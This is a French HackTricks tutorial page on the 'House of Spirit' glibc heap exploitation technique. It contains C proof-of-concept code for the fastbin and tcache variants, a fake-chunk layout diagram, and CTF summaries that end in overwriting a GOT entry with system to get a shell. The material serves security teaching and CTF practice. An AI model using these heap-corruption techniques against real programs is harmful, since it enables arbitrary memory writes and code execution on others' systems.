# House of Spirit

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

### Code

<details>

<summary>House of Spirit</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### Objectif

- Pouvoir ajouter dans le tcache / fast bin une adresse afin de pouvoir l'allouer ultérieurement

### Prérequis

- Cette attaque exige que l'attaquant puisse créer quelques fake fast chunks en indiquant correctement leur valeur de size, puis pouvoir free le premier fake chunk afin qu'il soit placé dans le bin.
- Avec **tcache (glibc ≥2.26)** l'attaque est encore plus simple : un seul fake chunk est nécessaire (aucune vérification de next-chunk size n'est effectuée sur le tcache path) tant que le fake chunk est aligné sur 0x10 et que son champ size appartient à un tcache bin valide (0x20-0x410 on x64).

### Attaque

- Créer des fake chunks qui contournent les vérifications de sécurité : il faudra en pratique 2 fake chunks indiquant aux bonnes positions les tailles correctes
- Faire en sorte de free le premier fake chunk pour qu'il atterrisse dans le fast or tcache bin, puis l'allocate pour overwrite cette adresse

**Le code de** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **est excellent pour comprendre l'attaque.** Bien que ce schéma extrait du code le résume assez bien :

<details>
<summary>Disposition du fake chunk</summary>
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
</details>

> [!TIP]
> Notez qu'il est nécessaire de créer le second chunk afin de bypass certaines sanity checks.

### Tcache house of spirit (glibc ≥2.26)

- Sur les glibc modernes, le **tcache fast-path** appelle `tcache_put` avant de valider la taille du chunk suivant/`prev_inuse`, donc seul le fake chunk courant doit sembler valide.
- Exigences :
- Le fake chunk doit être **aligné sur 16 octets** et ne pas être marqué `IS_MMAPPED`/`NON_MAIN_ARENA`.
- `size` doit appartenir à un tcache bin et inclure le **bit prev_inuse à 1** (`size | 1`).
- Le tcache pour ce bin ne doit pas être plein (max par défaut 7 entrées).
- PoC minimal (stack chunk):
```c
unsigned long long fake[6] __attribute__((aligned(0x10)));
// chunk header at fake[0]; usable data starts at fake+2
fake[1] = 0x41;              // fake size (0x40 bin, prev_inuse=1)
void *p = &fake[2];          // points inside fake chunk
free(p);                     // goes straight into tcache
void *q = malloc(0x30);      // returns stack address fake+2
```
- **Safe-linking** n'est pas un obstacle ici : le forward pointer stocké dans tcache est automatiquement encodé comme `fd = ptr ^ (heap_base >> 12)` pendant `free`, donc l'attaquant n'a pas besoin de connaître la clé lorsqu'il utilise un seul fake chunk.
- Cette variante est pratique lorsque les glibc hooks ont été supprimés (≥2.34) et que vous voulez un arbitrary write rapide ou chevaucher un target buffer (par ex., stack/BSS) avec un tcache chunk sans créer de corruptions supplémentaires.

## Examples

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc infoleak** : Via un overflow, il est possible de changer un pointeur pour qu'il pointe vers une adresse GOT afin de leak une adresse libc via l'action de lecture du CTF.
- **House of Spirit** : En abusant d'un compteur qui compte le nombre de "rifles", il est possible de générer une fake size du premier fake chunk, puis en abusant d'un "message" il est possible de faker la seconde size d'un chunk et enfin en abusant d'un overflow il est possible de changer un pointeur qui va être freeé de sorte que notre premier fake chunk soit freeé. Ensuite, nous pouvons l'allouer et à l'intérieur se trouvera l'adresse vers laquelle le "message" est stocké. Il est alors possible de faire pointer cela vers l'entrée `scanf` dans la table GOT, afin de l'overwrite avec l'adresse de system.\
La prochaine fois que `scanf` est appelé, nous pouvons envoyer l'input `"/bin/sh"` et obtenir un shell.

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc leak** : Buffer de stack non initialisé.
- **House of Spirit** : Nous pouvons modifier le premier index d'un tableau global de pointeurs heap. Avec une modification d'un seul octet, nous utilisons `free` sur un fake chunk à l'intérieur d'un chunk valide, de sorte que nous obtenons une situation d'overlapping chunks après une nouvelle allocation. Avec cela, une simple attaque de Tcache poisoning fonctionne pour obtenir un arbitrary write primitive.

## References

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)
- [https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c)

{{#include ../../banners/hacktricks-training.md}}
